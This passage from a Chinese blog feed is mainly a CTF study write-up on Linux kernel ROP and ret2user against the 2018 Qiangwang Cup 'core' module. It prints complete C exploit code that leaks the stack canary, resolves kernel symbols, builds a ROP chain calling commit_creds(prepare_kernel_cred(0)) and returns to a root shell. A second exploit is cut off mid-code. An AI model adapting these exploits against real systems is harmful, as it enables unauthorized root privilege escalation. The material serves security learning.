$DASFLAG|tee /home/$user/flag /flag</span><br><span class="line">fi</span><br><span class="line">chown root:$user /home/$user/flag /flag</span><br><span class="line">chmod 740 /home/$user/flag /flag</span><br></pre></td></tr></table></figure><p>这里是设置的动态flag</p><p>这样将docker环境打包好后，直接输入 <code>docker compose up -d </code> 命令，即可自动部署。</p><p><strong>当你使用docker compose up 命令启动容器时，Docker Compose会读取docker-compose.yml文件并使用Dockerfile构建镜像，然后根据文件中配置启动容器，并执行start.sh脚本。，容器启动后，就可以通过指定的端口访问容器中运行的应用或服务。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 kernel-ROP &amp; ret2user &amp; bypass-SMEP 的学习总结</title>
      <link href="/posts/a31a5755.html"/>
      <url>/posts/a31a5755.html</url>
      
        <content type="html"><![CDATA[<p>内核态的 <code>ROP</code> 和用户态的思路和做法是一样的，都是利用 <code>gadget</code> 来不断控制执行流，进行任意的函数调用。不过获取基地址还有搜索 <code>gadget</code> 等一些小细节发生了变化，但思想不变，所以理解起来应该还是很快的</p><h2 id="kernel-ROP">kernel-ROP</h2><p>例题是 <a href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%20%E5%BC%BA%E7%BD%91%E6%9D%AFkernel%20pwn-core">2018强网杯 pwn-core</a></p><h3 id="代码分析">代码分析</h3><p>发现 <code>ioctl</code> 函数中可以控制 <code>off</code> 这个全局变量（如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051126597.png" alt="image-20230405112654518" style="zoom:50%;" /><p><code>core_read</code> 函数，存在数组索引溢出的漏洞， <code>off</code> 我们可控，且程序没有做任何检查，<code>v5</code> 是在栈中，因此配合 <code>copy_to_user</code> 函数可以泄露栈中的任意数据，这里考虑来泄露 <code>canary</code> 以便后面的 <code>rop</code> 执行。</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051128320.png" alt="image-20230405112810250" style="zoom:50%;" /><p>通过分析 <code>off</code> 为 <code>0x40</code> 的时候<code>&amp;v5[off]</code> 正好指向了 <code>canary</code> 的位置（这里就是 <code>PWN</code> 手的基本技能，所以不再赘述），<code>copy_to_user</code> 会将内核中的数据 <code>copy</code> 到用户空间中，也就是赋值给了 <code>a1</code> 。</p><p><code>core_copy_func</code> 函数中存在一个强转的漏洞（如下），将 <code>__int64</code> 类型的 <code>a1</code> ，强转为了 <code>unsigned __int16</code> 类型，如果我们将 <code>a1</code> 设置为 <code>0xffffffffffff0000 | (0xd0)</code> ，就可以在绕过 <code>if(a1 &gt; 63)</code> 检查的情况下执行 <code>qmemcpy</code> 函数完成栈溢出</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081646889.png" alt="image-20230408164606742" style="zoom:50%;" /><p>不过上面这里只是能控制 <code>a1</code> 这个字节数，想要 <code>ROP</code> 还需要控制 <code>name</code> 数组中的数据。</p><p>通过查看 <code>core_write</code> 函数，发现这里可以直接控制 <code>name</code> 数组中的内容，如此任意读和任意写都有了，就可以开始我们的 <code>kernel-ROP</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081718605.png" alt="image-20230408171831543"></p><h3 id="利用过程">利用过程</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081726031.png" alt="image-20230408172611971"></p><p>因为程序开了 <code>canary</code> ，所以 <code>ROP</code> 之前需要先进行泄露 <code>canary</code></p><h4 id="泄露-canary">泄露 <code>canary</code></h4><p>所以泄露 <code>canary</code> 的部分 <code>exp</code> 如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">    canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里一定要注意，从内核 <code>copy</code> 过来的数据有 <code>64</code> 个字节，而不是只有 <code>canary</code> ，当时程序就定义了一个 <code>int</code> 类型的变量  <code>canary</code> 传入了地址进行接收，结果直接报错（原因是破坏了用户程序的 <code>canary</code>）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051735283.png" alt="image-20230405173514198"></p><h4 id="获取函数的真实地址">获取函数的真实地址</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>从 <code>/proc/kallsyms</code> 文件中可以获取任意一个函数的真实地址，本题的 <code>init</code> 文件中将 <code>/proc/kallsyms</code> 文件 <code>copy</code> 了一份叫做 <code>/tmp/kallsyms</code> ，读取该文件，即可得到函数的真实地址，但如果想获取 <code>vmlinux</code> 中的基地址，我们还需要拿到函数在 <code>vmlinux</code> 中的偏移。</p><h5 id="获取vmlinux中的函数偏移">获取vmlinux中的函数偏移</h5><p>因为开了 <code>KASLR</code> ，所以函数的真实地址需要获取基地址和函数偏移才行。</p><p>使用 <code>readelf -s vmlinux | grep vuln</code> 获取其地址（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051802154.png" alt="image-20230405180248088"></p><p>然后再用 <code>checksec</code> 命令来获取基地址（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051804686.png" alt="image-20230405180406627"></p><p>得到 <code>prepare_kernel_cred</code> 的偏移为 <code>0x9cce0</code>  , <code>commit_creds</code> 函数的偏移为 <code>0x9c8e0</code></p><p>把这些偏移写回到上面的脚本即可，之所以要拿到 <code>vmlinux</code> 的基地址是因为后续的 <code>gadget</code> 偏移需要加上基地址才能得到 <code>gadget</code> 的真实地址。</p><h4 id="获取-gadget">获取 <code>gadget</code></h4><p>如下方法查看 <code>gadget</code> 会比较方便</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary vmlinux &gt; ropgadget</span><br><span class="line">grep &#x27;: pop rdi ; ret&#x27; ropgadget </span><br></pre></td></tr></table></figure><p>或者用 <code>vscode</code> 打开 <code>ropgadget</code> 文件， <code>ctrl+f</code> 来搜索也可以</p><p>找到的 <code>gadget</code> 需要先减去 <code>vmlinux</code> 的基地址得到 <code>gadget</code> 的偏移</p><p>最后在 <code>exp</code> 中，一个 <code>gadget</code> 的真实地址应该是 <code>vmlinux_base</code> 加上其偏移</p><h4 id="ROP-链的布置"><code>ROP</code> 链的布置</h4><p>我们最后希望用 <code>ROP</code> 来执行 <code>commit_creds(prepare_kernel_cred(0))</code> ，<code>prepare_kernel_cred(0)</code> 会返回一个 <code>root</code> 权限的 <code>cred</code> 结构体指针，而 <code>commit_creds</code> 函数可以将该结构体指针作用于当前进程，接着我们返回用户态，去执行一个 <code>system(&quot;/bin/sh&quot;)</code> 便可以稳定的以 <code>root</code> 权限执行命令了。</p><p>正常情况下，我们需要用 <code>pop rdi ; ret</code> 这个 <code>gadget</code> 来控制 <code>prepare_kernel_cred</code> 函数的参数，我们也可以成功搜到这个 <code>gadget</code> ，但问题在于没有 <code>mov rdi,rax ; ret</code> 这个 <code>gadget</code> 来传递给 <code>commit_creds</code> 函数参数，通过搜索发现具有一个 <code>mov rdi, rax ; jmp rdx</code> 这个 <code>gadget</code> ，并且存在 <code>pop rdx ; ret</code> 来控制 <code>rdx</code> ，因此 <code>rop</code> 链的布置如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br></pre></td></tr></table></figure><p>此时 <code>commit_creds(prepare_kernel_cred(0))</code> 执行完毕，但需要来稳固程序，因为在内核态栈溢出后，栈中的一些数据被损坏，其中包括了用户态的状态信息，一旦损失了这些信息，重新切换到用户态时系统就会崩溃。所以我们要在攻击之前先保存一下状态信息，将其构造在内核栈中，最后返回的时候就是正常的。</p><p>系统权限分为内核态和用户态，分离的实现是 <code>swapgs</code> 指令，该指令将 <code>gs</code> 寄存器的值与 <code>IA32_KERNEL_GS_BASE MSR</code> 地址中的值交换。内核态常规操作（如系统调用）的入口处，执行 <code>swapgs</code> 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 <code>swapgs</code></p><p><code>iretq</code> 指令用来恢复用户空间，它会从栈中弹出已经保存的 <code>RIP</code> <code>CS</code> <code>RFLAGS</code> <code>RSP</code> <code>SS</code> 恢复之前的执行环境，所以最后执行 <code>iretq</code> 指令，恢复最开始保存的寄存器值即可。</p><p>所以 <code>ROP</code> 链的部分为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">rop[i++] = user_ss;<span class="comment">//SS</span></span><br></pre></td></tr></table></figure><p>下面两张图片是 <code>iretq</code> 指令执行前后的情况，可以看到已经从内核态切换到了用户态（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840059.png" alt="image-20230408183923247"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840996.png" alt="image-20230408183934789"></p><p>因为 <code>RIP</code> 设置的是用户态中 <code>system(&quot;/bin/sh&quot;)</code> 的地址，因此开启了新的 <code>root shell</code> （如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081843627.png" alt="image-20230408184359505"></p><h3 id="EXP">EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">   rop[i++]=commit_creds;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line">   </span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2user">ret2user</h2><p><code>ret2user</code> 和上面的 <code>ROP</code> 非常相似（毕竟本质上还是 <code>ROP</code> ），给我的感觉是 <code>ret2user</code> 在控制参数方面有很大的优势，它是将执行流返回到了用户态中布置的函数上，虽然执行的函数是位于内核空间，但因为我们的权限是 <code>ring 0</code>，因此依然可以正常运行。其根本原因是因为内核空间可以访问用户空间的进程（反之则不行），以内核的权限执行用户空间的代码完成提权（前提是没有开启 <code>SMEP</code> 保护）</p><h3 id="EXP-v2">EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, 